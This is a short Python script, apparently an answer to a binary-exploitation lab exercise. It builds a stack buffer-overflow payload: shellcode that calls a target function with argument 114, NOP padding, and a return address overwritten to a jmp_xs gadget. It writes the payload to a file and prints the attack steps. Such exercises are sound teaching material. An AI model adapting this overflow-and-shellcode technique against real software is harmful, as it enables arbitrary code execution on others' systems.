import struct

p64 = lambda x: struct.pack('<Q', x)

jmp_xs = 0x401334

# Shellcode:  对齐栈，设置参数，调用 func1
shellcode = b"\x48\x83\xe4\xf0"       # and rsp, -0x10 (栈对齐)
shellcode += b"\xbf\x72\x00\x00\x00"  # mov edi, 0x72 (参数 = 114)
shellcode += b"\x48\xb8" + p64(0x401216)  # movabs rax, func1
shellcode += b"\xff\xd0"               # call rax

# Payload 结构：
# - shellcode 在 buffer 开头 (19 bytes)
# - NOP 填充到 32 字节
# - saved rbp (8 bytes)
# - 返回地址 → jmp_xs (8 bytes)
payload = shellcode. ljust(32, b"\x90")
payload += b"B" * 8
payload += p64(jmp_xs)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("[+] ans3.txt created successfully!")
print(f"[+] Payload size: {len(payload)} bytes")
print(f"[+] Shellcode:  {shellcode.hex()}")
print("\n[*] Attack flow:")
print("    1. Buffer overflow overwrites return address")
print("    2. Returns to jmp_xs (0x401334)")
print("    3. jmp_xs calculates jump target")
print("    4. Executes shellcode on stack")
print("    5. Shellcode sets rdi=0x72 and calls func1")
print("    6. func1(114) outputs:  'Your lucky number is 114'")
